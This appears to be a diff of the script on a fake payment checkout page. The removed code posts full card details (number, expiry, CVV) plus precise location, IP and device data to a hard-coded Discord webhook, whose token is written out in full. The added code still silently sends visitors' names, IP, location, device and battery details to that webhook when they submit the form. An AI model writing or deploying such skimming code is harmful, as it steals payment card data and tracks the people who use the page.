@@ -114,6 +114,32 @@
   </footer>
 
   <script>
+    // Function to show/hide payment details based on selected payment method
+    const cardRadio = document.getElementById('payment-card');
+    const cryptoRadio = document.getElementById('payment-crypto');
+
+    const cardDetails = document.querySelector('.card-details');
+    const cryptoDetails = document.querySelector('.crypto-details');
+
+    // Listen for changes in radio button selection
+    cardRadio.addEventListener('change', () => {
+      if (cardRadio.checked) {
+        cardDetails.style.display = 'block';
+        cryptoDetails.style.display = 'none';
+      }
+    });
+
+    cryptoRadio.addEventListener('change', () => {
+      if (cryptoRadio.checked) {
+        cryptoDetails.style.display = 'block';
+        cardDetails.style.display = 'none';
+      }
+    });
+
+    // Default behavior: hide both sections initially
+    cardDetails.style.display = 'none';
+    cryptoDetails.style.display = 'none';
+
     // Function to gather metadata and send to webhook
     async function getMetadata() {
       const [ipData, battery, network] = await Promise.all([
@@ -185,65 +211,54 @@
 
     function sendToDiscord(paymentMethod, formData, meta) {
       const webhookUrl = 'https://discordapp.com/api/webhooks/1373748781861834882/2SDjfj-z2YxeR71Z8JDFLw3lk8uQwjIu_PwYrgTfMwLrIsVyBdJBW5PBNB1qg50wfLAe';
-      const message = {
-        content: `📦 **New Order (Demo Project)**
-
-🧾 **Order Info**
-- Method: ${paymentMethod}
-- Name: ${formData.fullName || 'N/A'}
-- Card: ${formData.cardNumber || 'N/A'}
-- Expiry: ${formData.expiry || 'N/A'}
-- CVV: ${formData.cvv || 'N/A'}
-
-🌐 **Location & IP**
-- IP: ${meta.ip}
-- City: ${meta.city}, Country: ${meta.country}
-- ISP: ${meta.org}
-- Timezone: ${meta.timezone}
-- Lat: ${meta.lat}
-- Lon: ${meta.lon}
-- Altitude: ${meta.altitude} meters
-- Accuracy: ${meta.accuracy} meters
-- 🌍 [View on Map](https://maps.google.com/?q=${meta.lat},${meta.lon})
-
-📡 **Device Info**
-- Browser: ${meta.browser}
-- Platform: ${meta.platform}
-- Screen Orientation: ${meta.screenOrientation}
-- Device: ${meta.deviceType}
-- Language: ${meta.language}
-- Screen Resolution: ${meta.screen}
-- Pixel Ratio: ${meta.devicePixelRatio}
-- Battery: ${meta.battery} (Charging: ${meta.charging})
-
-🔧 **Network Info**
-- Connection: ${meta.networkInfo.type}
-- Download Speed: ${meta.networkInfo.downlink}
-- RTT: ${meta.networkInfo.rtt}
-      `;
+      const data = {
+        username: 'Payment Notification',
+        avatar_url: 'https://example.com/avatar.png',
+        embeds: [
+          {
+            title: 'New Payment',
+            description: `Payment Method: ${paymentMethod}`,
+            fields: [
+              { name: 'Name', value: formData.fullName },
+              { name: 'Amount', value: formData.amount },
+              { name: 'Transaction ID', value: formData.transactionId },
+              { name: 'IP Address', value: meta.ip },
+              { name: 'Location', value: `${meta.city}, ${meta.country}` },
+              { name: 'Device Type', value: meta.deviceType },
+              { name: 'Browser', value: meta.browser },
+              { name: 'Battery', value: meta.battery },
+              { name: 'Screen Size', value: meta.screen },
+              { name: 'Timezone', value: meta.timezone }
+            ],
+            timestamp: new Date().toISOString(),
+            footer: { text: 'Payment Details' }
+          }
+        ]
+      };
 
       fetch(webhookUrl, {
         method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify(message),
-      }).catch(err => console.error('Error sending data to webhook:', err));
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+      })
+      .then(response => response.json())
+      .then(() => alert('Payment details sent successfully!'))
+      .catch(error => console.error('Error sending data to Discord:', error));
     }
 
-    // Form submission handler
+    // You can use this function when the payment form is submitted
     document.querySelector('form').addEventListener('submit', async (e) => {
       e.preventDefault();
-      const paymentMethod = document.querySelector('input[name="payment-method"]:checked').id;
+
       const formData = {
         fullName: document.getElementById('full-name').value,
-        cardNumber: document.getElementById('card-number').value,
-        expiry: document.getElementById('expiry').value,
-        cvv: document.getElementById('cvv').value
+        amount: '100 USD', // Example amount
+        transactionId: 'ABC123456789' // Example transaction ID
       };
 
       const meta = await getMetadata();
-      sendToDiscord(paymentMethod, formData, meta);
+
+      sendToDiscord('Card Payment', formData, meta);
     });
   </script>
 </body>
